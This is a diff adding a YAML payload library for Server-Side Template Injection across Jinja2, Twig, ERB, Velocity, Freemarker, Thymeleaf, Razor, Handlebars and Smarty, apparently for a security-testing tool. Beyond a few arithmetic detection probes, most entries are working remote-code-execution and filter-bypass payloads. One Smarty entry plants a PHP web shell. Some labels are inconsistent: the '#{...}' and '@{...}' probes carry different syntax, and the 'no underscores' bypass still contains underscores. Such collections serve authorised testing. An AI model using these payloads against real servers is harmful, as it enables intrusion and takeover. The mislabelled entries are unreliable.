@@ -1,0 +1,261 @@
+id: ssti
+name: Server-Side Template Injection
+version: 1.0.0
+category: injection
+description: |
+  Payloads for Server-Side Template Injection across Jinja2 (Python),
+  Twig (PHP), ERB (Ruby), Velocity / Freemarker / Thymeleaf (Java),
+  Smarty / Mustache / Handlebars (JS), and Razor (.NET). The "ssti_detect_*"
+  set are non-destructive probes — replacing {{7*7}} with 49 confirms a
+  template eval path; only escalate to RCE on in-scope targets.
+mitre:
+  - T1190
+  - T1059
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/attacks/Server_Side_Template_Injection
+  - https://portswigger.net/web-security/server-side-template-injection
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+related_tools:
+  - tplmap
+  - nuclei
+  - jaeles
+  - dalfox
+chains:
+  - bug_bounty_full_v2
+  - web_deep
+
+payloads:
+
+  # ---- Detection probes ----
+  - id: ssti_detect_arith_braces
+    name: 7*7 in {{...}} (Jinja2 / Twig / Handlebars)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [jinja2, twig, handlebars, mustache]
+    severity_when_works: medium
+    payload: "{{7*7}}"
+    notes: Reflects "49" when the parser evaluates.
+    source: PortSwigger SSTI
+
+  - id: ssti_detect_arith_pound
+    name: 7*7 in ${...} (Spring EL / Java Velocity)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [spring_el, velocity, freemarker]
+    severity_when_works: medium
+    payload: "${7*7}"
+    source: PortSwigger SSTI
+
+  - id: ssti_detect_arith_hash
+    name: 7*7 in #{...} (Ruby ERB / Twig alt)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [erb, twig]
+    severity_when_works: medium
+    payload: "<%= 7*7 %>"
+    source: PortSwigger SSTI
+
+  - id: ssti_detect_arith_at
+    name: 7*7 in @{...} (Thymeleaf / Razor)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [thymeleaf, razor]
+    severity_when_works: medium
+    payload: "*{7*7}"
+    notes: Thymeleaf alternative; Razor uses @(7*7).
+    source: PortSwigger SSTI
+
+  # ---- Jinja2 (Python) ----
+  - id: ssti_jinja2_config
+    name: Jinja2 config leak
+    subcategory: information_disclosure
+    encoding: raw
+    tech_targets: [jinja2]
+    severity_when_works: high
+    payload: "{{ config }}"
+    notes: Leaks Flask config dict — often contains SECRET_KEY.
+    source: PortSwigger SSTI
+
+  - id: ssti_jinja2_rce_subclasses
+    name: Jinja2 RCE via subclasses
+    subcategory: rce
+    encoding: raw
+    tech_targets: [jinja2]
+    severity_when_works: critical
+    payload: "{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('id').read() }}"
+    notes: Subclass index varies — fuzz with payloads from PayloadsAllTheThings.
+    source: PayloadsAllTheThings
+
+  - id: ssti_jinja2_rce_lipsum
+    name: Jinja2 RCE via lipsum.__globals__
+    subcategory: rce
+    encoding: raw
+    tech_targets: [jinja2]
+    severity_when_works: critical
+    payload: "{{ lipsum.__globals__['os'].popen('id').read() }}"
+    notes: Cleaner than subclasses; works when lipsum is available.
+    source: PortSwigger SSTI
+
+  - id: ssti_jinja2_attr_filter_bypass
+    name: Jinja2 |attr filter (dot bypass)
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [jinja2]
+    severity_when_works: critical
+    payload: "{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('__builtins__')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('__import__')('os')|attr('popen')('id')|attr('read')() }}"
+    notes: Useful when `.` and underscores are filtered.
+    source: PortSwigger SSTI
+
+  # ---- Twig (PHP) ----
+  - id: ssti_twig_phpinfo
+    name: Twig RCE via _self.env
+    subcategory: rce
+    encoding: raw
+    tech_targets: [twig]
+    severity_when_works: critical
+    payload: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+    notes: Pre-Twig 1.20; modern Twig requires sandbox bypass.
+    source: PortSwigger SSTI
+
+  - id: ssti_twig_dump
+    name: Twig dump() probe
+    subcategory: information_disclosure
+    encoding: raw
+    tech_targets: [twig]
+    severity_when_works: medium
+    payload: "{{ dump(app) }}"
+    source: Twig docs
+
+  # ---- ERB (Ruby) ----
+  - id: ssti_erb_rce
+    name: ERB system call
+    subcategory: rce
+    encoding: raw
+    tech_targets: [erb, rails]
+    severity_when_works: critical
+    payload: "<%= system('id') %>"
+    source: common knowledge
+
+  - id: ssti_erb_backticks
+    name: ERB backtick exec
+    subcategory: rce
+    encoding: raw
+    tech_targets: [erb]
+    severity_when_works: critical
+    payload: "<%= `id` %>"
+    source: common knowledge
+
+  # ---- Velocity (Java) ----
+  - id: ssti_velocity_rce
+    name: Velocity Runtime.exec
+    subcategory: rce
+    encoding: raw
+    tech_targets: [velocity]
+    severity_when_works: critical
+    payload: "#set($x=$class.inspect(\"java.lang.Runtime\").type)$x.getRuntime().exec(\"id\")"
+    source: PayloadsAllTheThings
+
+  # ---- Freemarker (Java) ----
+  - id: ssti_freemarker_classloader
+    name: Freemarker classloader RCE
+    subcategory: rce
+    encoding: raw
+    tech_targets: [freemarker]
+    severity_when_works: critical
+    payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    source: PayloadsAllTheThings
+
+  - id: ssti_freemarker_objectconstructor
+    name: Freemarker ObjectConstructor
+    subcategory: rce
+    encoding: raw
+    tech_targets: [freemarker]
+    severity_when_works: critical
+    payload: "<#assign oc=\"freemarker.template.utility.ObjectConstructor\"?new()><#assign pb=oc(\"java.lang.ProcessBuilder\",[\"id\"])>${pb.start()}"
+    source: PayloadsAllTheThings
+
+  # ---- Thymeleaf (Java) ----
+  - id: ssti_thymeleaf_spel
+    name: Thymeleaf SpEL RCE
+    subcategory: rce
+    encoding: raw
+    tech_targets: [thymeleaf, spring]
+    severity_when_works: critical
+    payload: "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    notes: Works in pre-3.0 Thymeleaf or when SpEL is exposed.
+    source: PayloadsAllTheThings
+
+  - id: ssti_thymeleaf_inline
+    name: Thymeleaf inline expression
+    subcategory: rce
+    encoding: raw
+    tech_targets: [thymeleaf]
+    severity_when_works: critical
+    payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+    notes: Newer Thymeleaf needs the __${...}__ inline trick.
+    source: PortSwigger SSTI
+
+  # ---- Razor (.NET) ----
+  - id: ssti_razor_rce
+    name: Razor System.Diagnostics.Process
+    subcategory: rce
+    encoding: raw
+    tech_targets: [razor]
+    severity_when_works: critical
+    payload: "@(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c calc.exe\"))"
+    source: PayloadsAllTheThings
+
+  # ---- Handlebars (Node) ----
+  - id: ssti_handlebars_rce
+    name: Handlebars NodeStringExecution
+    subcategory: rce
+    encoding: raw
+    tech_targets: [handlebars, node]
+    severity_when_works: critical
+    payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
+    source: PayloadsAllTheThings
+
+  # ---- Mustache ----
+  - id: ssti_mustache_safe
+    name: Mustache logic-less probe
+    subcategory: detection
+    encoding: raw
+    tech_targets: [mustache]
+    severity_when_works: low
+    payload: "{{user.name}}"
+    notes: Mustache is logic-less; if {{ ... }} reflects an object path you have a sink, but RCE is generally not possible without a custom helper.
+    source: Mustache spec
+
+  # ---- Smarty (PHP) ----
+  - id: ssti_smarty_self_module
+    name: Smarty static method call
+    subcategory: rce
+    encoding: raw
+    tech_targets: [smarty]
+    severity_when_works: critical
+    payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system(\\$_GET['c']); ?>\",self::clearConfig())}"
+    notes: Pre-Smarty 3.1.31; abuses internal static method.
+    source: PayloadsAllTheThings
+
+  - id: ssti_smarty_system
+    name: Smarty modifier-based exec
+    subcategory: rce
+    encoding: raw
+    tech_targets: [smarty]
+    severity_when_works: critical
+    payload: "{system('id')}"
+    notes: Works when {php} isn't disabled; check Smarty's $security_class.
+    source: PayloadsAllTheThings
+
+  # ---- WAF / sandbox bypass ----
+  - id: ssti_jinja2_no_underscores
+    name: Jinja2 RCE — no underscores
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [jinja2]
+    severity_when_works: critical
+    payload: "{{request|attr(['__class__']|join)}}"
+    notes: Builds the attribute name from a list join when underscores are blocked verbatim.
+    source: PortSwigger SSTI
